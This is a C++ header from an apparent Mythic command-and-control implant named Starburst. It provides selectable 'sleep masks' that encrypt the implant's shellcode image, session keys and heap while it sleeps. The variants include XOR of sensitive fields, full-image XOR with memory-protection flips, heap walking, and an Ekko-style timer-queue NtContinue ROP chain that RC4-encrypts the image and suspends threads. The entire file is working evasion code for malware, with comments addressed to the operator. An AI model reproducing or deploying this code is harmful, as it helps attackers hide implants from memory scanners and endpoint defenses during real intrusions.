#ifndef STARBURST_EVASION_SLEEP_MASKS_H
#define STARBURST_EVASION_SLEEP_MASKS_H

/*
 * Sleep masks - operator-customizable data masking during sleep.
 *
 * This file provides compile-time selectable masking implementations
 * for evasion_pre_sleep() and evasion_post_sleep(). The pattern follows
 * spoof_profiles.h: preprocessor selection via SLEEP_MASK_TYPE.
 *
 * WORKFLOW - Swapping masks:
 *
 *   1. Select a mask type in the Mythic build dialog, or set
 *      #define SLEEP_MASK_TYPE MASK_* in config.h for manual builds.
 *
 *   2. For MASK_CUSTOM, edit the custom section below with your own
 *      masking logic. Must implement mask_pre_sleep() and mask_post_sleep().
 *
 * AVAILABLE MASKS:
 *
 *   MASK_DEFAULT     - XOR sensitive fields only (AES key + UUIDs, ~104 bytes)
 *   MASK_FULL_IMAGE  - XOR entire shellcode image (VirtualProtect RW↔RX flip)
 *   MASK_HEAP        - XOR sensitive fields + all heap allocations
 *   MASK_EKKO        - Timer-queue ROP: RC4-encrypts entire image during sleep (x64)
 *   MASK_CUSTOM      - Operator-defined masking logic
 *
 * NOTE: MASK_EKKO replaces the entire sleep cycle (pre + sleep + post) via
 * evasion_ekko_sleep(). It uses CreateTimerQueueTimer + NtContinue ROP to
 * encrypt the image, sleep, and decrypt - all from ntdll timer-thread context.
 * On x86 builds, MASK_EKKO falls back to MASK_DEFAULT behavior.
 */

#include <constexpr.h>
#include <stdint.h>
#include <evasion/sleep_mask_types.h>

#ifndef SLEEP_MASK_TYPE
#define SLEEP_MASK_TYPE MASK_DEFAULT
#endif


#if SLEEP_MASK_TYPE == MASK_DEFAULT

/* ── Default: XOR sensitive fields only ──
 * Masks AES-256 session key (32 bytes) and both UUIDs (36 bytes each).
 * Lightweight - only ~104 bytes touched. Agent code and heap remain plaintext.
 */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_FULL_IMAGE

/* ── Full image: XOR entire shellcode region ──
 * Masks all code and embedded data in the shellcode image.
 * Defeats YARA rules, signature scans, and string matching during sleep.
 * Requires VirtualProtect RX→RWX→RX flip - generates ETW telemetry.
 *
 * ARCHITECTURE: Like Ekko, this mask owns the entire sleep cycle. The
 * pre/post split doesn't work here because mask_pre_sleep returns into
 * evasion_pre_sleep / sleep_with_jitter - code that was just XOR'd.
 * Instead, fi_sleep() does: XOR → NtDelayExecution → un-XOR → return.
 * All mask functions remain in the skip region and never get encrypted.
 */

static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void;

static auto declfn xor_image(
    instance& inst, uintptr_t skip_base, uint32_t skip_size
) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.evasion.ekko.img_base );
    auto size = inst.evasion.ekko.img_size;
    auto key  = inst.evasion.ekko.rc4_key;

    for ( uint32_t i = 0; i < size; i++ ) {
        uintptr_t addr = reinterpret_cast<uintptr_t>( base + i );
        if ( skip_base && addr >= skip_base && addr < skip_base + skip_size )
            continue;
        base[i] ^= key[ i % 16 ];
    }
}

static auto declfn flip_protection(
    instance& inst, DWORD new_protect
) -> DWORD {
    typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

    auto pVirtualProtect = reinterpret_cast<fn_VirtualProtect>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "VirtualProtect" ) ) );
    if ( !pVirtualProtect ) return 0;

    DWORD old_protect = 0;
    pVirtualProtect(
        reinterpret_cast<LPVOID>( inst.evasion.ekko.img_base ),
        inst.evasion.ekko.img_size,
        new_protect,
        &old_protect
    );
    return old_protect;
}

static auto declfn fi_skip_region(
    uintptr_t& out_base, uint32_t& out_size
) -> void {
    uintptr_t addrs[] = {
        reinterpret_cast<uintptr_t>( &xor_image ),
        reinterpret_cast<uintptr_t>( &flip_protection ),
        reinterpret_cast<uintptr_t>( &fi_skip_region ),
        reinterpret_cast<uintptr_t>( &fi_sleep ),
        reinterpret_cast<uintptr_t>( &xor_sensitive_data ),
    };
    uintptr_t lo = addrs[0], hi = addrs[0];
    for ( int i = 1; i < 5; i++ ) {
        if ( addrs[i] < lo ) lo = addrs[i];
        if ( addrs[i] > hi ) hi = addrs[i];
    }
    out_base = lo;
    out_size = static_cast<uint32_t>( hi - lo ) + 0x400;
}

/* Owns entire sleep cycle: XOR image → sleep → un-XOR image.
 * Never returns while image is encrypted - caller code stays valid. */
static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
    if ( !inst.evasion.ekko.initialized ) {
        LARGE_INTEGER delay;
        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
        inst.ntdll.NtDelayExecution( FALSE, &delay );
        return;
    }

    uintptr_t skip_base; uint32_t skip_size;
    fi_skip_region( skip_base, skip_size );

    /* mask - RWX keeps skip region executable while we XOR the rest */
    xor_sensitive_data( inst );
    flip_protection( inst, PAGE_EXECUTE_READWRITE );
    xor_image( inst, skip_base, skip_size );

    /* sleep - image is encrypted, these functions are in skip region */
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );

    /* unmask */
    xor_image( inst, skip_base, skip_size );
    flip_protection( inst, PAGE_EXECUTE_READ );
    xor_sensitive_data( inst );
}

/* Pre/post are no-ops - fi_sleep owns the full cycle. */
static auto declfn mask_pre_sleep( instance& inst ) -> void {
    (void)inst;
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    (void)inst;
}


#elif SLEEP_MASK_TYPE == MASK_HEAP

/* ── Heap: XOR sensitive fields + all heap allocations ──
 * Walks HeapWalk() over GetProcessHeap() and XOR-masks all BUSY blocks.
 * Catches dynamically allocated buffers (task data, downloaded files, etc.)
 * No VirtualProtect calls needed - heap is already RW.
 * Agent code (.text) remains plaintext.
 */

typedef BOOL (WINAPI *fn_HeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );
typedef HANDLE (WINAPI *fn_GetProcessHeap)( void );

static auto declfn xor_heap_blocks( instance& inst ) -> void {
    auto pGetProcessHeap = reinterpret_cast<fn_GetProcessHeap>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "GetProcessHeap" ) ) );
    auto pHeapWalk = reinterpret_cast<fn_HeapWalk>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "HeapWalk" ) ) );

    if ( !pGetProcessHeap || !pHeapWalk ) return;

    HANDLE heap = pGetProcessHeap();
    if ( !heap ) return;

    auto key = inst.evasion.ekko.rc4_key;
    PROCESS_HEAP_ENTRY entry = {};
    while ( pHeapWalk( heap, &entry ) ) {
        if ( !( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) ) continue;
        if ( entry.cbData < 16 ) continue;

        auto block_start = reinterpret_cast<uintptr_t>( entry.lpData );
        auto key_start   = reinterpret_cast<uintptr_t>( inst.evasion.ekko.rc4_key );
        if ( block_start <= key_start &&
             key_start < block_start + entry.cbData )
            continue;

        auto data = reinterpret_cast<uint8_t*>( entry.lpData );
        for ( uint32_t i = 0; i < entry.cbData; i++ ) {
            data[i] ^= key[ i % 16 ];
        }
    }
}

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
    xor_heap_blocks( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_heap_blocks( inst );
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_CUSTOM

/* ── Custom mask ── OPERATOR: edit below ──
 *
 * Implement your own masking logic. Must provide mask_pre_sleep() and
 * mask_post_sleep() with matching signatures.
 *
 * Ideas:
 *   - Full image + heap combined
 *   - Selective section masking (mask .rdata but not .text)
 *   - Custom encryption (RC4/AES instead of XOR)
 *   - Stack masking for sensitive local variables
 *
 * xor_sensitive_data(inst) is available - call it for baseline field protection.
 */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your pre-sleep masking here */
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    /* OPERATOR: Add your post-sleep masking here */
    xor_sensitive_data( inst );
}


#elif SLEEP_MASK_TYPE == MASK_EKKO

/* ── Ekko v2: Timer-queue ROP with heap obfuscation (x64 only) ──
 *
 * Uses RtlCreateTimer (ntdll) to schedule a 7-context NtContinue ROP chain:
 *   [0] WaitForSingleObject(EvntStart, INFINITE)  - gate until ready
 *   [1] VirtualProtect(RW)                        - flip image to writable
 *   [2] SystemFunction032(encrypt)                - RC4-encrypt shellcode image
 *   [3] WaitForSingleObject(process, timeout)     - sleep while encrypted
 *   [4] SystemFunction032(decrypt)                - RC4-decrypt (symmetric)
 *   [5] VirtualProtect(RX)                        - restore execute permissions
 *   [6] SetEvent(EvntEnd)                         - signal completion
 *
 * Additionally:
 *   - Suspends all threads (except current + timer worker) before sleep
 *   - XOR-obfuscates all non-default heap blocks with random keys
 *   - Uses NtSignalAndWaitForSingleObject to atomically trigger + wait
 *   - Three events for phased synchronization (timer/start/end)
 *   - Worker thread ID captured via timer callback in phase 1
 *
 * NOTE: x64 only. On x86 builds this falls back to MASK_DEFAULT behavior.
 */

#ifdef _WIN64

typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING, *PUSTRING;

typedef struct _EKKO_HEAP_OBF {
    BYTE ObfKeys[16];
} EKKO_HEAP_OBF;

typedef NTSTATUS (NTAPI  *fnRtlCreateTimerQueue)( PHANDLE );
typedef NTSTATUS (NTAPI  *fnRtlCreateTimer)( HANDLE, PHANDLE, WAITORTIMERCALLBACKFUNC, PVOID, ULONG, ULONG, ULONG );
typedef NTSTATUS (NTAPI  *fnRtlDeleteTimerQueue)( HANDLE );
typedef NTSTATUS (NTAPI  *fnNtCreateEvent)( PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG, BOOLEAN );
typedef NTSTATUS (NTAPI  *fnNtWaitForSingleObject)( HANDLE, BOOLEAN, PLARGE_INTEGER );
typedef NTSTATUS (NTAPI  *fnNtSignalAndWait)( HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER );
typedef NTSTATUS (NTAPI  *fnSystemFunction032)( PUSTRING, PUSTRING );
typedef VOID     (NTAPI  *fnNtContinue)( PCONTEXT, BOOLEAN );
typedef VOID     (NTAPI  *fnRtlCaptureContext)( PCONTEXT );
typedef BOOL     (WINAPI *fnSetEvent)( HANDLE );
typedef HANDLE   (WINAPI *fnCreateToolhelp32Snapshot)( DWORD, DWORD );
typedef BOOL     (WINAPI *fnThread32First)( HANDLE, LPTHREADENTRY32 );
typedef BOOL     (WINAPI *fnThread32Next)( HANDLE, LPTHREADENTRY32 );
typedef HANDLE   (WINAPI *fnOpenThread)( DWORD, BOOL, DWORD );
typedef DWORD    (WINAPI *fnSuspendThread)( HANDLE );
typedef DWORD    (WINAPI *fnResumeThread)( HANDLE );
typedef ULONG    (WINAPI *fnGetProcessHeaps)( ULONG, PHANDLE );
typedef BOOL     (WINAPI *fnHeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );

static auto declfn ekko_xor_cipher(
    uint8_t* data, uint32_t size, uint8_t* key, uint32_t key_size
) -> void {
    for ( uint32_t i = 0, j = 0; i < size; i++, j++ ) {
        if ( j == key_size ) j = 0;
        if ( i % 2 == 0 )
            data[i] ^= key[j];
        else
            data[i] ^= key[j] ^ static_cast<uint8_t>( j );
    }
}

static auto declfn ekko_suspend_threads(
    instance& inst, DWORD worker_tid
) -> void {
    DWORD pid = RtlGetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    auto pSnap = reinterpret_cast<fnCreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst = reinterpret_cast<fnThread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext = reinterpret_cast<fnThread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen = reinterpret_cast<fnOpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pSuspend = reinterpret_cast<fnSuspendThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "SuspendThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pSuspend ) return;

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    THREADENTRY32 te = {};
    te.dwSize = sizeof( THREADENTRY32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid &&
                 te.th32ThreadID != tid &&
                 te.th32ThreadID != worker_tid ) {
                HANDLE ht = pOpen( THREAD_ALL_ACCESS, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pSuspend( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn ekko_resume_threads(
    instance& inst, DWORD worker_tid
) -> void {
    DWORD pid = RtlGetCurrentProcessId();
    DWORD tid = RtlGetCurrentThreadId();

    auto pSnap = reinterpret_cast<fnCreateToolhelp32Snapshot>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "CreateToolhelp32Snapshot" ) ) );
    auto pFirst = reinterpret_cast<fnThread32First>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32First" ) ) );
    auto pNext = reinterpret_cast<fnThread32Next>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "Thread32Next" ) ) );
    auto pOpen = reinterpret_cast<fnOpenThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "OpenThread" ) ) );
    auto pResume = reinterpret_cast<fnResumeThread>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "ResumeThread" ) ) );

    if ( !pSnap || !pFirst || !pNext || !pOpen || !pResume ) return;

    HANDLE snap = pSnap( TH32CS_SNAPTHREAD, pid );
    if ( snap == INVALID_HANDLE_VALUE ) return;

    THREADENTRY32 te = {};
    te.dwSize = sizeof( THREADENTRY32 );

    if ( pFirst( snap, &te ) ) {
        do {
            if ( te.th32OwnerProcessID == pid &&
                 te.th32ThreadID != tid &&
                 te.th32ThreadID != worker_tid ) {
                HANDLE ht = pOpen( THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID );
                if ( ht ) {
                    pResume( ht );
                    inst.kernel32.CloseHandle( ht );
                }
            }
        } while ( pNext( snap, &te ) );
    }
    inst.kernel32.CloseHandle( snap );
}

static auto declfn ekko_heap_obfuscate(
    instance& inst, EKKO_HEAP_OBF* obf, DWORD worker_tid, bool start
) -> void {
    auto pGetProcessHeaps = reinterpret_cast<fnGetProcessHeaps>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "GetProcessHeaps" ) ) );
    auto pHeapWalk = reinterpret_cast<fnHeapWalk>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "HeapWalk" ) ) );

    if ( !pGetProcessHeaps || !pHeapWalk ) return;

    ULONG num_heaps = pGetProcessHeaps( 0, nullptr );
    if ( num_heaps == 0 ) return;

    HANDLE heap_buf[64] = {};
    if ( num_heaps > 64 ) num_heaps = 64;
    num_heaps = pGetProcessHeaps( num_heaps, heap_buf );

    if ( start ) {
        ULONG seed = inst.kernel32.GetTickCount();
        for ( uint32_t i = 0; i < 16; i++ ) {
            seed = inst.ntdll.RtlRandomEx( &seed );
            obf->ObfKeys[i] = static_cast<BYTE>( seed & 0xFF );
        }
        ekko_suspend_threads( inst, worker_tid );
    } else {
        ekko_resume_threads( inst, worker_tid );
    }

    HANDLE default_heap = NtCurrentPeb()->ProcessHeap;

    for ( ULONG i = 0; i < num_heaps; i++ ) {
        if ( heap_buf[i] == default_heap ) continue;

        PROCESS_HEAP_ENTRY entry = {};
        while ( pHeapWalk( heap_buf[i], &entry ) ) {
            if ( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
                ekko_xor_cipher(
                    reinterpret_cast<uint8_t*>( entry.lpData ),
                    entry.cbData, obf->ObfKeys, 16 );
            }
        }
    }
}

static auto NTAPI ekko_get_worker_tid( PVOID param, BOOLEAN ) -> void {
    *reinterpret_cast<DWORD*>( param ) = RtlGetCurrentThreadId();
}

static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {

    /* ── resolve ntdll APIs via hash ── */

    auto pRtlCreateTimerQueue = reinterpret_cast<fnRtlCreateTimerQueue>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCreateTimerQueue" ) ) );
    auto pRtlCreateTimer = reinterpret_cast<fnRtlCreateTimer>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCreateTimer" ) ) );
    auto pRtlDeleteTimerQueue = reinterpret_cast<fnRtlDeleteTimerQueue>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlDeleteTimerQueue" ) ) );
    auto pNtCreateEvent = reinterpret_cast<fnNtCreateEvent>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtCreateEvent" ) ) );
    auto pNtWaitForSingleObject = reinterpret_cast<fnNtWaitForSingleObject>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtWaitForSingleObject" ) ) );
    auto pNtSignalAndWait = reinterpret_cast<fnNtSignalAndWait>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtSignalAndWaitForSingleObject" ) ) );
    auto pNtContinue = reinterpret_cast<fnNtContinue>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "NtContinue" ) ) );
    auto pRtlCaptureContext = reinterpret_cast<fnRtlCaptureContext>(
        resolve::_api( inst.ntdll.handle, expr::hash_string( "RtlCaptureContext" ) ) );

    auto pSetEvent = reinterpret_cast<fnSetEvent>(
        resolve::_api( inst.kernel32.handle, expr::hash_string( "SetEvent" ) ) );

    /* SystemFunction032 from advapi32 (already loaded at init) */
    auto pSystemFunction032 = reinterpret_cast<fnSystemFunction032>(
        resolve::_api( inst.advapi32.handle, expr::hash_string( "SystemFunction032" ) ) );

    if ( !pRtlCreateTimerQueue || !pRtlCreateTimer || !pRtlDeleteTimerQueue ||
         !pNtCreateEvent || !pNtWaitForSingleObject || !pNtSignalAndWait ||
         !pNtContinue || !pRtlCaptureContext || !pSetEvent || !pSystemFunction032 ) {
        DBG_PRINT( inst, "ekko: API resolution failed, falling back to XOR mask\n" );
        xor_sensitive_data( inst );
        return;
    }

    /* ── image base/size and fresh RC4 key ── */

    PVOID  img_base = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
    ULONG  img_size = inst.evasion.ekko.img_size;

    BYTE rnd_key[16] = {};
    inst.bcrypt_mod.BCryptGenRandom( nullptr, rnd_key, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG );

    USTRING key_data = {};
    key_data.Buffer        = rnd_key;
    key_data.Length        = 16;
    key_data.MaximumLength = 16;

    USTRING img_data = {};
    img_data.Buffer        = img_base;
    img_data.Length        = img_size;
    img_data.MaximumLength = img_size;

    /* ── create timer queue and three events ── */

    HANDLE queue     = nullptr;
    HANDLE evt_timer = nullptr;
    HANDLE evt_start = nullptr;
    HANDLE evt_end   = nullptr;
    HANDLE timer     = nullptr;
    DWORD  delay     = 0;
    DWORD  value     = 0;
    DWORD  worker_tid = 0;
    EKKO_HEAP_OBF heap_obf = {};

    if ( pRtlCreateTimerQueue( &queue ) != 0 ) {
        xor_sensitive_data( inst );
        return;
    }

    /* NotificationEvent = 0 */
    if ( pNtCreateEvent( &evt_timer, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
         pNtCreateEvent( &evt_start, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
         pNtCreateEvent( &evt_end,   EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ) {
        goto ekko_leave;
    }

    /* ── phase 1: capture worker thread ID and initial CONTEXT ── */
    {
        CONTEXT ctx_init = {};

        if ( pRtlCreateTimer( queue, &timer,
                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( ekko_get_worker_tid ),
                &worker_tid, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
            goto ekko_leave;

        if ( pRtlCreateTimer( queue, &timer,
                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pRtlCaptureContext ),
                &ctx_init, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
            goto ekko_leave;

        if ( pRtlCreateTimer( queue, &timer,
                reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pSetEvent ),
                evt_timer, delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 )
            goto ekko_leave;

        if ( pNtWaitForSingleObject( evt_timer, FALSE, nullptr ) != 0 )
            goto ekko_leave;

        /* ── phase 2: build 7-context ROP chain ── */

        CONTEXT ctx[7] = {};
        for ( int i = 0; i < 7; i++ ) {
            auto dst = reinterpret_cast<uint8_t*>( &ctx[i] );
            auto src = reinterpret_cast<const uint8_t*>( &ctx_init );
            for ( uint32_t b = 0; b < sizeof( CONTEXT ); b++ ) dst[b] = src[b];
            ctx[i].Rsp -= sizeof( PVOID );
        }

        /* [0] WaitForSingleObject(EvntStart, INFINITE) - gate */
        ctx[0].Rip = reinterpret_cast<DWORD64>( inst.kernel32.WaitForSingleObject );
        ctx[0].Rcx = reinterpret_cast<DWORD64>( evt_start );
        ctx[0].Rdx = static_cast<DWORD64>( INFINITE );
        ctx[0].R8  = 0;

        /* [1] VirtualProtect(img, size, PAGE_READWRITE, &value) */
        ctx[1].Rip = reinterpret_cast<DWORD64>( inst.kernel32.VirtualProtect );
        ctx[1].Rcx = reinterpret_cast<DWORD64>( img_base );
        ctx[1].Rdx = static_cast<DWORD64>( img_size );
        ctx[1].R8  = static_cast<DWORD64>( PAGE_READWRITE );
        ctx[1].R9  = reinterpret_cast<DWORD64>( &value );

        /* [2] SystemFunction032(&img_data, &key_data) - encrypt */
        ctx[2].Rip = reinterpret_cast<DWORD64>( pSystemFunction032 );
        ctx[2].Rcx = reinterpret_cast<DWORD64>( &img_data );
        ctx[2].Rdx = reinterpret_cast<DWORD64>( &key_data );

        /* [3] WaitForSingleObject(current_process, sleep_ms) - sleep */
        ctx[3].Rip = reinterpret_cast<DWORD64>( inst.kernel32.WaitForSingleObject );
        ctx[3].Rcx = reinterpret_cast<DWORD64>( static_cast<HANDLE>( (HANDLE)(LONG_PTR)-1 ) );
        ctx[3].Rdx = static_cast<DWORD64>( sleep_ms );
        ctx[3].R8  = 0;

        /* [4] SystemFunction032(&img_data, &key_data) - decrypt */
        ctx[4].Rip = reinterpret_cast<DWORD64>( pSystemFunction032 );
        ctx[4].Rcx = reinterpret_cast<DWORD64>( &img_data );
        ctx[4].Rdx = reinterpret_cast<DWORD64>( &key_data );

        /* [5] VirtualProtect(img, size, PAGE_EXECUTE_READ, &value) */
        ctx[5].Rip = reinterpret_cast<DWORD64>( inst.kernel32.VirtualProtect );
        ctx[5].Rcx = reinterpret_cast<DWORD64>( img_base );
        ctx[5].Rdx = static_cast<DWORD64>( img_size );
        ctx[5].R8  = static_cast<DWORD64>( PAGE_EXECUTE_READ );
        ctx[5].R9  = reinterpret_cast<DWORD64>( &value );

        /* [6] SetEvent(EvntEnd) - signal completion */
        ctx[6].Rip = reinterpret_cast<DWORD64>( pSetEvent );
        ctx[6].Rcx = reinterpret_cast<DWORD64>( evt_end );

        /* ── obfuscate heap + suspend threads ── */
        ekko_heap_obfuscate( inst, &heap_obf, worker_tid, true );
        xor_sensitive_data( inst );

        /* ── queue the 7 NtContinue timer callbacks ── */
        bool ok = true;
        for ( int i = 0; i < 7; i++ ) {
            if ( pRtlCreateTimer( queue, &timer,
                    reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pNtContinue ),
                    &ctx[i], delay += 100, 0, WT_EXECUTEINTIMERTHREAD ) != 0 ) {
                ok = false;
                DBG_PRINT( inst, "ekko: RtlCreateTimer[%d] failed\n", i );
                break;
            }
        }

        if ( ok ) {
            /* Atomically signal EvntStart and wait on EvntEnd */
            pNtSignalAndWait( evt_start, evt_end, FALSE, nullptr );
        }

        /* ── restore ── */
        xor_sensitive_data( inst );
        ekko_heap_obfuscate( inst, &heap_obf, worker_tid, false );
    }

ekko_leave:
    if ( queue )     pRtlDeleteTimerQueue( queue );
    if ( evt_timer ) inst.kernel32.CloseHandle( evt_timer );
    if ( evt_start ) inst.kernel32.CloseHandle( evt_start );
    if ( evt_end )   inst.kernel32.CloseHandle( evt_end );
}

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    (void)inst;
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    (void)inst;
}

#else /* x86 fallback */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

#endif /* _WIN64 */

#elif SLEEP_MASK_TYPE == MASK_UDRL

/*
 * UDRL mask - delegates to evasion_udrl_sleep() which handles the entire
 * sleep cycle (like Ekko). The pre/post hooks just do the basic XOR of
 * sensitive fields for cases where the fallback path uses pre/delay/post.
 */

static auto declfn mask_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

static auto declfn mask_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;
    xor_sensitive_data( inst );
}

#endif

#endif
